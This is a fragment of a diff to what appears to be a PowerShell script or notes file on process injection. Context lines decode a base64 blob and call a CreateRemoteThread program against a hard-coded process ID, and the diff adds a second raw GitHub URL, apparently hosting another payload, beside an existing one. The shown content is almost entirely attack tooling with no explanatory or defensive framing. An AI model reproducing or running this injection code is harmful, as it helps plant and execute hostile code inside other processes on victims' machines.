@@ -5,6 +5,7 @@ $b64 = [System.Convert]::FromBase64String($base)
 [CreateRemoteThread.Program]::Main(@(8812))
 
 https://raw.githubusercontent.com/vinicius-batistella/Rumo/refs/heads/main/create.txt
+https://raw.githubusercontent.com/vinicius-batistella/Rumo/refs/heads/main/nt.txt
 
 ==============================================================================================================================
 
